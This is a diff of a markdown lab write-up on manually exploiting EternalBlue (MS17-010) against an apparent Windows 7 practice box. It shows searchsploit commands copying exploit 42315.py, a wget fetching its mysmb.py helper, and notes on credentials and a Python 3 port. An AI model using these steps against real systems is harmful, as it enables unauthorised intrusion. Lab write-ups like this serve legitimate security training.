@@ -25,13 +25,11 @@ seeing the `Windows 7 Professional 7601 Service Pack 1 microsoft-ds` in nmap of 
 
 ## Exploit
 
-Although metasploit has a module for this and it a quick couple of commands to execute I will perform this manually.
-I looked up manual exlpoitation of Eternal Blue and found this  article: [redteamzone](https://redteamzone.com/EternalBlue/).
-Following the steps layed out while being mindful this is a windows 7 exploit using old versions and implementations of python.
+Although metasploit has a module for this and it a quick couple of commands to execute I will perform this manually. I looked up manual exploitation of Eternal Blue and found this  article: [redteamzone](https://redteamzone.com/EternalBlue/). Following the steps layed out while being mindful this is a windows 7 exploit using old versions and implementations of python. 
 
 ```bash
 searchsploit eternal
-searchsploit -m 42315.py # -m copies to current workign directory
+searchsploit -m 42315.py # -m copies to current working directory
 ```
 ![searchsploit](Screenshots/searchsploit.png)
 
@@ -39,6 +37,11 @@ The dependency missing from my VM like the guide is mysmb.
 ```bash
 wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
 ```
+Potentially change username and password to `'vagrant'`, ran regardless to detirmine are incompatiblities 
+![concat](canonlyconcatstr.png)
+
+I later returned to this box once more time and recognised it was considerable out of date so I tried the [huey](https://dev.to/0xhuey/manually-exploiting-ms17-010-python2-to-python3-3l2k)
+
 
 ```bash
 # reverse_tcp for the OSCP guidelines
